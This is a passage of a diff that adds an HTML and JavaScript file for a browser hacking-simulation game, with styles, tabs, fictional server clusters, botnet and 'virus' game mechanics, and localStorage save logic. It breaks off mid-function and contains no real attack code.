@@ -1,0 +1,4068 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🌐 世界服务器 - 万维网攻防模拟</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+    background: #000;
+    color: #00ff41;
+    font-family: 'Courier New', Courier, monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
+body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.08) 2px, rgba(0,0,0,0.08) 4px);
+    pointer-events: none;
+    z-index: 9999;
+}
+body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.5) 100%);
+    pointer-events: none;
+    z-index: 9998;
+}
+
+.header {
+    background: linear-gradient(90deg, #001a00, #002800, #001a00);
+    border-bottom: 2px solid #00ff41;
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 0 20px rgba(0,255,65,0.2);
+    flex-wrap: wrap;
+    gap: 10px;
+}
+.header-title { font-size: 18px; font-weight: bold; color: #00ff41; text-shadow: 0 0 10px #00ff41; letter-spacing: 2px; }
+.header-sub { font-size: 9px; color: #005500; margin-top: 2px; letter-spacing: 1px; }
+
+.stats-bar {
+    display: flex;
+    gap: 14px;
+    align-items: center;
+    flex-wrap: wrap;
+}
+.stat-item {
+    font-size: 11px;
+    color: #00aa00;
+    background: rgba(0,255,65,0.05);
+    border: 1px solid rgba(0,255,65,0.2);
+    padding: 4px 10px;
+    border-radius: 3px;
+}
+.stat-item b { color: #00ff41; font-size: 13px; }
+
+.tab-bar {
+    display: flex;
+    gap: 2px;
+    padding: 8px 20px 0;
+    background: rgba(0,15,0,0.8);
+    border-bottom: 1px solid #003300;
+    flex-wrap: wrap;
+}
+.tab-btn {
+    flex: 0 0 auto;
+    padding: 6px 14px;
+    background: rgba(0,255,65,0.03);
+    border: 1px solid #003300;
+    border-bottom: none;
+    border-radius: 4px 4px 0 0;
+    color: #006600;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.2s;
+}
+.tab-btn:hover { color: #00aa00; background: rgba(0,255,65,0.06); }
+.tab-btn.active { color: #00ff41; background: rgba(0,255,65,0.1); border-color: #00ff41; text-shadow: 0 0 6px rgba(0,255,65,0.4); }
+
+.tab-content { display: none; padding: 14px 20px; }
+.tab-content.active { display: block; }
+
+/* 世界地图 */
+.map-container { background: rgba(0,10,0,0.6); border: 1px solid #003300; border-radius: 8px; padding: 16px; }
+.map-svg { width: 100%; height: auto; }
+.cluster-node { cursor: pointer; transition: all 0.3s; }
+.cluster-node:hover { filter: brightness(1.5); }
+.cluster-node circle { transition: r 0.3s; }
+.cluster-node:hover circle { r: 26; }
+.cluster-label { font-size: 10px; fill: #00aa00; text-anchor: middle; pointer-events: none; }
+.cluster-level { font-size: 8px; fill: #005500; text-anchor: middle; pointer-events: none; }
+.link-line { stroke: #003300; stroke-width: 1; fill: none; }
+.link-line.owned { stroke: #00cc44; stroke-width: 1.5; }
+.link-line.tunnel { stroke: #ff6600; stroke-width: 1.5; stroke-dasharray: 5,3; }
+.link-line.tunnel-owned { stroke: #00ff41; stroke-width: 2; stroke-dasharray: 5,3; }
+.cluster-owned circle { fill: #004400; stroke: #00ff41; }
+.cluster-broken circle { fill: #330000; stroke: #ff4444; }
+.cluster-normal circle { fill: #001a00; stroke: #006600; }
+.cluster-protected circle { stroke: #ffaa00; stroke-width: 2.5; }
+
+/* 服务器群详情 */
+.cluster-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 14px;
+    background: rgba(0,255,65,0.04);
+    border: 1px solid #003300;
+    border-radius: 6px;
+    margin-bottom: 12px;
+    flex-wrap: wrap;
+}
+.cluster-header h2 { font-size: 16px; color: #00ff41; text-shadow: 0 0 6px rgba(0,255,65,0.3); }
+.cluster-badge { font-size: 10px; padding: 3px 10px; border-radius: 3px; border: 1px solid; }
+.badge-protected { color: #ffaa00; border-color: #ffaa00; background: rgba(255,170,0,0.08); }
+.badge-honeypot { color: #ff1744; border-color: #ff1744; background: rgba(255,23,68,0.08); }
+.badge-owned { color: #00ff41; border-color: #00ff41; background: rgba(0,255,65,0.08); }
+
+/* 终端 */
+.terminal {
+    background: #000;
+    border: 1px solid #003300;
+    border-radius: 4px;
+    padding: 10px;
+    font-size: 10px;
+    line-height: 1.6;
+    height: 240px;
+    overflow-y: auto;
+    margin-bottom: 8px;
+    font-family: 'Courier New', monospace;
+}
+.term-line { margin: 1px 0; word-break: break-all; }
+.term-cmd { color: #00ff41; }
+.term-cmd::before { content: '$ '; color: #005500; }
+.term-out { color: #008800; }
+.term-ok { color: #00cc44; }
+.term-err { color: #ff6666; }
+.term-warn { color: #ffaa00; }
+.term-info { color: #00aaff; }
+.term-dim { color: #003300; }
+.term-cursor { display: inline-block; width: 7px; height: 12px; background: #00ff41; animation: blink 0.8s infinite; vertical-align: middle; }
+@keyframes blink { 0%,49%{opacity:1} 50%,100%{opacity:0} }
+
+.cmd-input-row { display: flex; gap: 6px; margin-bottom: 8px; }
+.cmd-input {
+    flex: 1;
+    background: #001a00;
+    border: 1px solid #003300;
+    color: #00ff41;
+    padding: 7px 10px;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    border-radius: 4px;
+    outline: none;
+}
+.cmd-input:focus { border-color: #00ff41; box-shadow: 0 0 6px rgba(0,255,65,0.2); }
+.cmd-input::placeholder { color: #003300; }
+
+.quick-btns { display: flex; gap: 4px; flex-wrap: wrap; margin-bottom: 8px; }
+.quick-btn {
+    flex: 0 0 auto;
+    padding: 5px 10px;
+    background: rgba(0,180,255,0.06);
+    border: 1px solid rgba(0,180,255,0.25);
+    color: #00aacc;
+    font-family: 'Courier New', monospace;
+    font-size: 10px;
+    cursor: pointer;
+    border-radius: 3px;
+    transition: all 0.2s;
+}
+.quick-btn:hover { background: rgba(0,180,255,0.12); color: #00d4ff; }
+.quick-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+/* 服务器列表 */
+.server-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 6px; margin-top: 10px; }
+.server-card {
+    background: rgba(0,15,0,0.8);
+    border: 1px solid #003300;
+    border-radius: 4px;
+    padding: 8px 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-size: 10px;
+}
+.server-card:hover { border-color: #00aa00; }
+.server-card.broken { border-color: #00ff41; background: rgba(0,255,65,0.04); }
+.server-card.targeting { border-color: #ff6600; box-shadow: 0 0 8px rgba(255,102,0,0.3); }
+.server-card .srv-name { color: #00ff41; font-weight: bold; }
+.server-card .srv-info { color: #006600; margin-top: 2px; }
+.server-hp-bar { height: 4px; background: #001a00; border-radius: 2px; overflow: hidden; margin-top: 4px; border: 1px solid #002200; }
+.server-hp-fill { height: 100%; transition: width 0.4s; }
+.hp-high { background: #00cc44; }
+.hp-mid { background: #ffaa00; }
+.hp-low { background: #ff4444; }
+.hp-zero { background: #003300; }
+
+/* 僵尸网络 */
+.botnet-panel { background: rgba(0,10,0,0.6); border: 1px solid #003300; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+.botnet-panel h3 { font-size: 13px; color: #00ff41; margin-bottom: 8px; }
+.botnet-list { display: flex; flex-direction: column; gap: 6px; }
+.botnet-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 12px;
+    background: rgba(0,255,65,0.04);
+    border: 1px solid #003300;
+    border-radius: 4px;
+    font-size: 11px;
+}
+.botnet-item .bn-name { color: #00ff41; }
+.botnet-item .bn-stats { color: #008800; font-size: 10px; }
+
+.attack-control {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+    flex-wrap: wrap;
+    margin-top: 10px;
+    padding: 10px;
+    background: rgba(0,180,255,0.03);
+    border: 1px solid rgba(0,180,255,0.15);
+    border-radius: 4px;
+}
+.attack-control select, .attack-control button {
+    background: #001a00;
+    border: 1px solid #003300;
+    color: #00aa00;
+    padding: 6px 10px;
+    font-family: 'Courier New', monospace;
+    font-size: 10px;
+    border-radius: 3px;
+    outline: none;
+}
+.attack-control button {
+    cursor: pointer;
+    background: rgba(255,102,0,0.1);
+    border-color: rgba(255,102,0,0.3);
+    color: #ff8844;
+}
+.attack-control button:hover { background: rgba(255,102,0,0.2); }
+.attack-control button:disabled { opacity: 0.4; cursor: not-allowed; }
+
+/* FBI面板 */
+.fbi-panel { background: rgba(0,10,0,0.6); border: 1px solid #003300; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+.fbi-status { font-size: 12px; padding: 10px; border-radius: 4px; margin-bottom: 10px; }
+.fbi-active { background: rgba(255,170,0,0.08); border: 1px solid rgba(255,170,0,0.3); color: #ffaa00; }
+.fbi-inactive { background: rgba(0,255,65,0.04); border: 1px solid #003300; color: #006600; }
+.fbi-honeypot { background: rgba(255,23,68,0.08); border: 1px solid rgba(255,23,68,0.3); color: #ff4466; }
+.fbi-section { margin-bottom: 10px; }
+.fbi-section-title { font-size: 11px; color: #005500; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 1px; }
+.fbi-protected-list { display: flex; gap: 6px; flex-wrap: wrap; }
+.fbi-protected-item { font-size: 10px; padding: 3px 8px; border: 1px solid #ffaa00; border-radius: 3px; color: #ffaa00; background: rgba(255,170,0,0.05); }
+
+/* 日志 */
+.log-container { background: rgba(0,10,0,0.6); border: 1px solid #002200; border-radius: 6px; padding: 10px 14px; max-height: 500px; overflow-y: auto; }
+.log-entry { font-size: 9px; padding: 3px 0; border-bottom: 1px solid #001500; display: flex; gap: 6px; }
+.log-entry:last-child { border-bottom: none; }
+.log-ts { color: #003300; min-width: 50px; }
+.log-type { min-width: 60px; font-weight: bold; }
+.log-type.attack { color: #ff8844; }
+.log-type.broken { color: #00ff41; }
+.log-type.fbi { color: #ffaa00; }
+.log-type.botnet { color: #ff44ff; }
+.log-type.system { color: #00aaff; }
+.log-msg { flex: 1; color: #006600; }
+
+/* 病毒武器库 */
+.virus-panel { background: rgba(0,10,0,0.6); border: 1px solid #003300; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+.virus-panel h3 { font-size: 13px; color: #00ff41; margin-bottom: 8px; }
+.zd-card { background: rgba(0,15,0,0.6); border: 1px solid; border-radius: 6px; padding: 10px; margin: 4px 0; box-shadow: 0 0 8px rgba(0,255,65,0.05); }
+.zd-card:hover { box-shadow: 0 0 14px rgba(0,255,65,0.12); }
+.zd-card .btn-virus { padding: 5px 14px; background: rgba(0,255,65,0.1); border: 1px solid #00ff41; color: #00ff41; font-family: 'Courier New', monospace; font-size: 10px; cursor: pointer; border-radius: 3px; }
+.zd-card .btn-virus:hover { background: rgba(0,255,65,0.2); }
+.virus-list { display: flex; flex-direction: column; gap: 6px; }
+.virus-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 12px;
+    background: rgba(0,255,65,0.04);
+    border: 1px solid #003300;
+    border-radius: 4px;
+    font-size: 11px;
+}
+.virus-item .vn-name { color: #00ff41; font-weight: bold; }
+.virus-item .vn-stats { color: #008800; font-size: 10px; }
+.virus-infected { animation: virusPulse 1s infinite; }
+@keyframes virusPulse {
+    0% { border-color: #ff4444; box-shadow: 0 0 5px rgba(255,68,68,0.3); }
+    50% { border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.6); }
+    100% { border-color: #ff4444; box-shadow: 0 0 5px rgba(255,68,68,0.3); }
+}
+
+/* 0day漏洞 */
+.zeroday-panel { background: rgba(0,10,0,0.6); border: 1px solid #003300; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+.zeroday-panel h3 { font-size: 13px; color: #00ff41; margin-bottom: 8px; }
+.zeroday-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 12px;
+    background: rgba(0,255,65,0.04);
+    border: 1px solid #003300;
+    border-radius: 4px;
+    font-size: 11px;
+    margin-bottom: 6px;
+}
+.zeroday-item .zd-name { color: #ffaa00; font-weight: bold; }
+.zeroday-item .zd-level { font-size: 10px; padding: 2px 6px; border-radius: 3px; }
+.zd-critical { background: rgba(255,23,68,0.2); color: #ff1744; border: 1px solid #ff1744; }
+.zd-high { background: rgba(255,170,0,0.2); color: #ffaa00; border: 1px solid #ffaa00; }
+.zd-medium { background: rgba(0,170,255,0.2); color: #00aaff; border: 1px solid #00aaff; }
+.zd-low { background: rgba(0,255,65,0.2); color: #00ff41; border: 1px solid #00ff41; }
+
+/* 黑市工具商店 */
+.shop-panel { background: rgba(0,10,0,0.6); border: 1px solid #003300; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+.shop-panel h3 { font-size: 13px; color: #00ff41; margin-bottom: 8px; }
+.shop-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 12px;
+    background: rgba(0,255,65,0.04);
+    border: 1px solid #003300;
+    border-radius: 4px;
+    font-size: 11px;
+    margin-bottom: 6px;
+}
+.shop-item .shop-name { color: #00ff41; font-weight: bold; }
+.shop-item .shop-price { color: #ffaa00; font-size: 10px; }
+.shop-item .shop-effect { color: #008800; font-size: 9px; }
+.shop-btn {
+    padding: 4px 10px;
+    background: rgba(0,255,65,0.1);
+    border: 1px solid rgba(0,255,65,0.3);
+    color: #00ff41;
+    font-family: 'Courier New', monospace;
+    font-size: 9px;
+    cursor: pointer;
+    border-radius: 3px;
+}
+.shop-btn:hover { background: rgba(0,255,65,0.2); }
+.shop-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+/* 通用 */
+.btn-row { display: flex; gap: 8px; justify-content: flex-end; margin-top: 10px; }
+.btn-close { padding: 6px 16px; background: rgba(255,68,68,0.08); border: 1px solid rgba(255,68,68,0.3); color: #ff6666; font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer; border-radius: 4px; }
+.btn-close:hover { background: rgba(255,68,68,0.15); }
+.btn-primary { padding: 6px 16px; background: rgba(0,255,65,0.08); border: 1px solid rgba(0,255,65,0.3); color: #00ff41; font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer; border-radius: 4px; }
+.btn-primary:hover { background: rgba(0,255,65,0.15); }
+.reset-btn { padding: 4px 10px; background: rgba(255,68,68,0.05); border: 1px solid rgba(255,68,68,0.2); color: #cc3333; font-family: 'Courier New', monospace; font-size: 8px; cursor: pointer; border-radius: 3px; }
+.reset-btn:hover { background: rgba(255,68,68,0.1); }
+
+.locked-overlay {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.95);
+    z-index: 10000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 16px;
+}
+.locked-overlay h1 { font-size: 20px; color: #ff4444; text-shadow: 0 0 10px rgba(255,68,68,0.5); }
+.locked-overlay p { font-size: 12px; color: #006600; }
+.locked-overlay .lock-icon { font-size: 48px; }
+
+/* 自动挖掘面板 */
+.automine-panel { background: rgba(0,10,0,0.6); border: 1px solid #003300; border-radius: 8px; padding: 14px; margin-bottom: 14px; }
+.automine-panel h3 { font-size: 13px; color: #00ff41; margin-bottom: 8px; }
+.progress-bar-wrap { background: #001a00; border: 1px solid #003300; border-radius: 4px; height: 20px; margin: 8px 0; overflow: hidden; }
+.progress-bar-fill { background: linear-gradient(90deg, #003300, #00ff41, #00ff41); height: 100%; transition: width 0.3s; border-radius: 3px; }
+.progress-text { font-size: 9px; color: #008800; text-align: center; margin: 4px 0; }
+.mine-result-table { width: 100%; border-collapse: collapse; font-size: 10px; margin-top: 8px; }
+.mine-result-table th { text-align: left; padding: 6px 8px; color: #00ff41; border-bottom: 1px solid #003300; }
+.mine-result-table td { padding: 6px 8px; border-bottom: 1px solid #001500; }
+.mine-result-table .grade-S { color: #ff1744; }
+.mine-result-table .grade-A { color: #ff9100; }
+.mine-result-table .grade-B { color: #ffea00; }
+.mine-result-table .grade-C { color: #76ff03; }
+.mine-result-table .grade-D { color: #00aaff; }
+.btn-mine { padding: 8px 20px; background: rgba(0,255,65,0.1); border: 1px solid #00ff41; color: #00ff41; font-family: 'Courier New', monospace; font-size: 12px; cursor: pointer; border-radius: 4px; letter-spacing: 1px; transition: all 0.2s; }
+.btn-mine:hover { background: rgba(0,255,65,0.2); box-shadow: 0 0 10px rgba(0,255,65,0.3); }
+.btn-mine:disabled { opacity: 0.4; cursor: not-allowed; }
+.btn-mine.stop { border-color: #ff4444; color: #ff4444; background: rgba(255,68,68,0.1); }
+.btn-mine.stop:hover { background: rgba(255,68,68,0.2); }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <div>
+        <div class="header-title">🌐 世界服务器</div>
+        <div class="header-sub">WORLD WIDE WEB ATTACK SIMULATION / 万维网攻防模拟</div>
+    </div>
+    <div class="stats-bar" id="statsBar">
+        <div class="stat-item">⚔️ 攻击力 <b id="statAttack">0</b></div>
+        <div class="stat-item">🛡️ 防御力 <b id="statDefense">0</b></div>
+        <div class="stat-item">🧟 僵尸网络 <b id="statBotnet">0</b>群</div>
+        <div class="stat-item">📊 已攻破 <b id="statBroken">0</b>/200</div>
+        <div class="stat-item">📅 回合 <b id="statRound">0</b></div>
+        <button class="reset-btn" onclick="confirmReset()">⚠ 重置</button>
+    </div>
+</div>
+
+<div class="tab-bar">
+    <button class="tab-btn active" onclick="switchTab('map')">🗺️ 世界地图</button>
+    <button class="tab-btn" onclick="switchTab('cluster')">💻 服务器群</button>
+    <button class="tab-btn" onclick="switchTab('botnet')">🧟 僵尸网络</button>
+    <button class="tab-btn" onclick="switchTab('fbi')">🛡️ FBI状态</button>
+    <button class="tab-btn" onclick="switchTab('tunnel')">🔗 代理隧道</button>
+    <button class="tab-btn" onclick="switchTab('virus')">🦠 病毒武器</button>
+    <button class="tab-btn" onclick="switchTab('zeroday')">💎 0day漏洞</button>
+    <button class="tab-btn" onclick="switchTab('automine')">⛏️ 自动挖掘</button>
+    <button class="tab-btn" onclick="switchTab('logs')">📊 攻击日志</button>
+</div>
+
+<div class="tab-content active" id="tab-map">
+    <div class="map-container" id="mapContainer">
+    </div>
+</div>
+
+<div class="tab-content" id="tab-cluster">
+    <div id="clusterView">
+        <p style="color:#006600;font-size:12px;">请在世界地图中选择一个服务器群。</p>
+    </div>
+</div>
+
+<div class="tab-content" id="tab-botnet">
+    <div id="botnetView"></div>
+</div>
+
+<div class="tab-content" id="tab-fbi">
+    <div id="fbiView"></div>
+</div>
+
+<div class="tab-content" id="tab-tunnel">
+    <div id="tunnelView"></div>
+</div>
+
+<div class="tab-content" id="tab-virus">
+    <div id="virusView"></div>
+</div>
+
+<div class="tab-content" id="tab-zeroday">
+    <div id="zerodayView"></div>
+</div>
+
+<div class="tab-content" id="tab-automine">
+    <div id="automineView"></div>
+</div>
+
+<div class="tab-content" id="tab-logs">
+    <div class="log-container" id="logContainer"></div>
+</div>
+
+<div class="locked-overlay" id="lockedOverlay" style="display:none;">
+    <div class="lock-icon">🔒</div>
+    <h1>世界服务器未解锁</h1>
+    <p>请在渗透学习平台中将全部4个节点学习进度提升至100%</p>
+    <p style="font-size:10px;color:#003300;">hack-training.html → 4节点全100% → 解锁</p>
+</div>
+
+<script>
+// ===== 常量 =====
+var WORLD_STATE_KEY = 'worldServerState';
+var ROUND_KEY = 'worldServerRound';
+
+var CLUSTERS_CONFIG = [
+    { id: 0, name: '电商云集群',    network: 'B', levelRange: [3, 5],  srvCount: 20, theme: 'ecommerce' },
+    { id: 1, name: '政府内网',      network: 'A', levelRange: [6, 8],  srvCount: 20, theme: 'government' },
+    { id: 2, name: '金融科技网',    network: 'A', levelRange: [4, 6],  srvCount: 20, theme: 'finance' },
+    { id: 3, name: '社交媒体群',    network: 'B', levelRange: [2, 4],  srvCount: 20, theme: 'social' },
+    { id: 4, name: '学术科研网',    network: 'A', levelRange: [1, 3],  srvCount: 20, theme: 'academic' },
+    { id: 5, name: '工业控制网',    network: 'A', levelRange: [5, 7],  srvCount: 20, theme: 'industrial' },
+    { id: 6, name: '医疗健康云',    network: 'A', levelRange: [2, 4],  srvCount: 20, theme: 'medical' },
+    { id: 7, name: '游戏服务集群',  network: 'B', levelRange: [3, 5],  srvCount: 20, theme: 'gaming' },
+    { id: 8, name: '暗网市场',      network: 'B', levelRange: [4, 6],  srvCount: 20, theme: 'darknet' },
+    { id: 9, name: '国际根服务器',  network: 'B', levelRange: [8, 10], srvCount: 20, theme: 'root' }
+];
+
+// 拓扑连接：同网络全连通 + 跨网代理隧道(1<->9)
+function getConnections(clusterId) {
+    var cfg = CLUSTERS_CONFIG[clusterId];
+    var conns = [];
+    CLUSTERS_CONFIG.forEach(function(c) {
+        if (c.id !== clusterId && c.network === cfg.network) {
+            conns.push(c.id);
+        }
+    });
+    // 代理隧道：政府内网(1) <-> 国际根服务器(9)
+    if (clusterId === 1) conns.push(9);
+    if (clusterId === 9) conns.push(1);
+    return conns;
+}
+
+var OS_LIST = ['Linux', 'Windows Server', 'Unix', 'FreeBSD', 'CentOS', 'Ubuntu', 'Debian'];
+var SERVICE_TYPES = ['HTTP', 'SSH', 'FTP', 'Database', 'API', 'Mail', 'DNS', 'Proxy'];
+var VULN_POOL = ['sql_injection', 'weak_ssh', 'xss', 'rce', 'lfi', 'priv_esc', 'weak_ftp', 'open_port', 'default_pass'];
+
+var THEME_NAMES = {
+    ecommerce: ['订单服务', '支付网关', '商品搜索', '库存系统', '用户中心', '推荐引擎', '物流跟踪', '评价系统', '优惠券服务', '商家后台'],
+    government: ['公文系统', '人口数据库', '税务平台', '社保系统', '工商登记', '统计门户', '审批系统', '档案管理', '政务大厅', '数据交换'],
+    finance: ['核心交易', '风控引擎', '清算系统', '银行卡务', '证券行情', '投资组合', '反洗钱', '信贷审批', '柜面系统', '结算中心'],
+    social: ['消息服务', '用户数据', '好友关系', '动态流', '图片存储', '推荐算法', '广告投放', '搜索索引', '通知服务', '直播流'],
+    academic: ['论文库', '选课系统', '成绩管理', '图书馆', '实验室设备', '校园门户', '邮箱系统', '科研计算', 'VPN网关', '教务系统'],
+    industrial: ['SCADA主机', 'PLC控制器', 'HMI界面', '数据采集', '报警系统', '远程终端', '工程站', '历史数据库', '通讯网关', '安全仪表'],
+    medical: ['HIS系统', '电子病历', '医保接口', '检验系统', '影像存储', '挂号平台', '药房管理', '住院管理', '手术排班', '体检中心'],
+    gaming: ['游戏服', '充值系统', '排行榜', '匹配引擎', '聊天服务', '存档系统', '反作弊', 'CDN节点', '日志分析', 'GM后台'],
+    darknet: ['匿名论坛', '交易市场', '加密通信', '混币服务', '文件托管', '洋葱路由', '黑市拍卖', '情报交换', '漏洞交易', '身份伪造'],
+    root: ['DNS根', 'CA证书', 'BGP路由', 'NTP时间', 'Whois数据库', 'IP分配', 'AS注册', '路由镜像', '任播节点', '根区文件']
+};
+
+// ===== 数据存储 =====
+function loadData() {
+    try {
+        var d = localStorage.getItem(WORLD_STATE_KEY);
+        if (d) {
+            var data = JSON.parse(d);
+            // 迁移：确保新增字段存在（兼容旧存档）
+            if (data.player && !data.player.dataFragments) data.player.dataFragments = [];
+            if (data.player && data.player.toolLevel === undefined) data.player.toolLevel = 0;
+            if (data.market === undefined) data.market = { btc: 0, reputation: 0 };
+            if (!data.viruses) data.viruses = [];
+            if (!data.zeroDays) data.zeroDays = [];
+            return data;
+        }
+    } catch(e) {}
+    return initWorldData();
+}
+
+function saveData(data) {
+    try {     // 同步病毒和0day到 investSimState_v13
+    try {
+        var invKey3 = 'investSimState_v13';
+        var raw3 = localStorage.getItem(invKey3);
+        if (raw3) {
+            var invSt3 = JSON.parse(raw3);
+            invSt3.wsTools = invSt3.wsTools || {};
+            invSt3.playerViruses = data.playerViruses || [];
+            invSt3.zeroDaysDiscovered = data.zeroDays || [];
+            invSt3.activeViruses = data.activeViruses || [];
+            localStorage.setItem(invKey3, JSON.stringify(invSt3));
+        }
+    } catch(e) {}
+localStorage.setItem(WORLD_STATE_KEY, JSON.stringify(data)); } catch(e) {}
+}
+
+function initWorldData() {
+    var clusters = CLUSTERS_CONFIG.map(function(cfg) {
+        var servers = [];
+        for (var i = 0; i < cfg.srvCount; i++) {
+            var level = randInt(cfg.levelRange[0], cfg.levelRange[1]);
+            var themeNames = THEME_NAMES[cfg.theme] || ['server'];
+            servers.push({
+                id: 'c' + cfg.id + '-s' + i,
+                name: themeNames[i % themeNames.length] + '-' + (i+1),
+                ip: '10.' + cfg.id + '.' + Math.floor(i/4) + '.' + ((i%4)*2+1),
+                os: OS_LIST[randInt(0, OS_LIST.length-1)],
+                serviceType: SERVICE_TYPES[randInt(0, SERVICE_TYPES.length-1)],
+                level: level,
+                hp: level * 50,
+                maxHp: level * 50,
+                defense: Math.ceil(level * 1.5),
+                isBroken: false,
+                reconDone: false,
+                forceRepairBuff: 0,
+                forceRepairDefense: 0,
+                vulnerabilities: shuffleArr(VULN_POOL).slice(0, randInt(1, 3))
+            });
+        }
+        return {
+            id: cfg.id,
+            name: cfg.name,
+            network: cfg.network,
+            levelRange: cfg.levelRange,
+            theme: cfg.theme,
+            isBroken: false,
+            isOwned: false,
+            connections: getConnections(cfg.id),
+            servers: servers,
+            ownedSince: null
+        };
+    });
+    return {
+        unlocked: false,
+        currentRound: parseInt(localStorage.getItem(ROUND_KEY) || '0', 10),
+        clusters: clusters,
+        selectedClusterId: -1,
+        selectedServerId: null,
+        player: {
+            attackPower: 10,
+            defensePower: 5,
+            ownedClusters: [],
+            ownedServers: 0,
+            hackTraceScore: 0,
+            dataFragments: [],
+            toolLevel: 0
+        },
+        market: {
+            btc: 0,
+            reputation: 0
+        },
+        fbi: {
+            active: false,
+            protectedClusters: [],
+            honeypotActive: false,
+            scanCounter: 0,
+            lastScanRound: 0,
+            honeypotDebuffEnds: 0,
+            scanBoostEnds: 0,
+            defeated: false,
+            defeatCooldown: 0,
+            forceRepairActive: false
+        },
+        tunnel: {
+            name: '代理隧道',
+            desc: '政府内网 ↔ 国际根服务器 跨网代理隧道',
+            level: 10,
+            attackPower: 5000,
+            defense: 10000,
+            hp: 10000,
+            maxHp: 10000,
+            isBroken: false,
+            reconDone: false,
+            vulnerabilities: ['rce', 'weak_ssh', 'open_port', 'default_pass']
+        },
+        mineState: {
+            active: false,
+            progress: 0,
+            total: 0,
+            results: []
+        },
+        logs: []
+    };
+}
+
+// ===== 工具函数 =====
+function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function clamp(v, min, max) { return Math.max(min, Math.min(max, v)); }
+
+function shuffleArr(arr) {
+    var a = arr.slice();
+    for (var i = a.length - 1; i > 0; i--) {
+        var j = Math.floor(Math.random() * (i + 1));
+        var t = a[i]; a[i] = a[j]; a[j] = t;
+    }
+    return a;
+}
+
+function now() {
+    var d = new Date();
+    return ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2)+':'+('0'+d.getSeconds()).slice(-2);
+}
+
+function addLog(data, type, msg) {
+    data.logs.unshift({ ts: now(), round: data.currentRound, type: type, msg: msg });
+    if (data.logs.length > 100) data.logs.length = 100;
+}
+
+function getCluster(data, id) { return data.clusters.find(function(c){return c.id===id;}); }
+function getServer(cluster, sid) { return cluster.servers.find(function(s){return s.id===sid;}); }
+// ===== 数据碎片与黑市联动 =====
+var FRAGMENT_TYPE_MAP = {
+    '电商云': '用户支付数据',
+    '政府内网': '政务机密文档',
+    '金融科技': '银行交易流水',
+    '社交媒体': '用户隐私档案',
+    '学术科研': '科研专利数据',
+    '工业控制': '工控系统配置',
+    '医疗健康': '患者医疗记录',
+    '游戏服务': '游戏源代码',
+    '暗网市场': '暗网交易记录',
+    '国际根服务器': '根域名解析日志'
+};
+
+function generateDataFragment(data, server, cluster) {
+    var fragName = cluster ? (FRAGMENT_TYPE_MAP[cluster.name] || '未知数据') : '跨网代理隧道数据';
+    var value = server.level * 500;
+    var btcReward = (value / 50000).toFixed(4);
+    var repReward = server.level;
+    var frag = {
+        id: 'frag_' + Date.now() + '_' + Math.floor(Math.random()*1000),
+        name: fragName,
+        type: cluster ? cluster.network : 'tunnel',
+        value: value,
+        btcReward: btcReward,
+        repReward: repReward,
+        fromCluster: cluster ? cluster.name : '代理隧道',
+        fromServer: server.name,
+        round: data.currentRound
+    };
+    data.player.dataFragments.push(frag);
+    syncFragmentsToInvestSim(data);
+    addLog(data, 'system', '💎 获得数据碎片：' + fragName + '（价值 ' + btcReward + ' BTC）');
+    termPrint('[💎] 获得数据碎片：' + fragName + '（可到暗网市场出售）', 'term-ok');
+}
+
+function syncFragmentsToInvestSim(data) {
+    try {
+        var investKey = 'investSimState_v13';
+        var raw = localStorage.getItem(investKey);
+        var investState = raw ? JSON.parse(raw) : {};
+        investState.worldFragments = (data.player.dataFragments || []).map(function(f) {
+            return {
+                id: f.id,
+                name: f.name,
+                type: f.type,
+                value: f.value,
+                btcReward: f.btcReward,
+                repReward: f.repReward,
+                fromCluster: f.fromCluster,
+                fromServer: f.fromServer,
+                round: f.round
+            };
+        });
+        // 确保 wsTools 字段存在
+        if (!investState.wsTools) investState.wsTools = { virusResearchSpeed:0, attackPowerBonus:0, zeroDayChance:0, botnetEfficiency:0 };
+        localStorage.setItem(investKey, JSON.stringify(investState));
+    } catch(e) {}
+}
+
+function loadMarketFromInvestSim(data) {
+    try {
+        var investKey = 'investSimState_v13';
+        var raw = localStorage.getItem(investKey);
+        if (!raw) return;
+        var investState = JSON.parse(raw);
+        var assets = investState.assets || [];
+        var crypto = assets.find(function(a) { return a.id === 'crypto'; });
